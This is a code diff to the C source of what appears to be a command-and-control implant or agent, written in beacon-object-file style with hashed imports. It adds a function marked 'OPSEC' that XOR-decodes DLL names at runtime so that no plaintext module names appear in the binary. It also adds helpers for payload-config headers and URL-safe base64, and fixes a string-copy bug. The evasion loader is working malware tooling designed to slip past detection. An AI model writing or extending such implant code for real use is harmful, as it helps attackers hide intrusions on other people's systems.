@@ -1,6 +1,7 @@
 #include "headers/celebi.h"
 
 WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
+WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR lpLibFileName);
 
 WINBASEAPI size_t MSVCRT$strlen(const char *str);
 
@@ -9,6 +10,25 @@ WINBASEAPI size_t MSVCRT$strlen(const char *str);
  * STRING MANIPULATION
  *
 */
+
+/*
+ *
+ * MODULE LOADING (OPSEC)
+ *
+ * Load a DLL whose name is stored XOR-encoded so no plaintext module names
+ * end up in the binary. The ror13 resolver only finds already-loaded modules,
+ * so call this before using hashed MODULE$Function imports from that DLL.
+*/
+
+void *load_module_xor(const unsigned char *encoded, int encoded_len, unsigned char key) {
+	char name[64];
+	int i;
+	for (i = 0; i < encoded_len && i < 63; i++) {
+		name[i] = (char)(encoded[i] ^ key);
+	}
+	name[i] = '\0';
+	return KERNEL32$LoadLibraryA(name);
+}
 
 void append_str(char *string, char *append) {
 	size_t current_len = MSVCRT$strlen(string);
@@ -21,11 +41,12 @@ void append_str(char *string, char *append) {
 
 char *clone_str(char *orig) {
 	size_t len = MSVCRT$strlen(orig);
-	char *string = KERNEL32$VirtualAlloc(0, len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+	char *string = KERNEL32$VirtualAlloc(0, len + 1, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
 	
 	for (int i = 0; i < len; i++) {
 		string[i] = orig[i];
 	}
+	string[len] = '\0';
 	
 	return string;
 }
@@ -100,6 +121,36 @@ void base64_encode(const char *in, const unsigned long in_len, char *out) {
 
 	out[out_index] = '\0';
 	return;
+}
+
+char *agent_unescape_crlf(const char *in) {
+	// Converts the literal 4-char sequence '\\r\\n' back to real CRLF.
+	// Used for the payload-config headers string, which cannot contain
+	// raw newlines inside the line-based linker config.spec.
+	size_t len = MSVCRT$strlen(in);
+	char *out = KERNEL32$VirtualAlloc(0, len + 1, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+	size_t o = 0;
+	for (size_t i = 0; i < len; ) {
+		if (i + 3 < len && in[i] == '\\' && in[i+1] == 'r' && in[i+2] == '\\' && in[i+3] == 'n') {
+			out[o++] = '\r';
+			out[o++] = '\n';
+			i += 4;
+		} else {
+			out[o++] = in[i];
+			i += 1;
+		}
+	}
+	out[o] = '\0';
+	return out;
+}
+
+void base64_url_encode(const char *in, const unsigned long in_len, char *out) {
+	// Same as base64_encode but URL-safe: '+' -> '-', '/' -> '_' (padding '=' kept).
+	base64_encode(in, in_len, out);
+	for (unsigned long i = 0; out[i] != '\0'; i++) {
+		if (out[i] == '+') out[i] = '-';
+		else if (out[i] == '/') out[i] = '_';
+	}
 }
 
 int base64_decode(const char *in, const unsigned long in_len, char *out) {
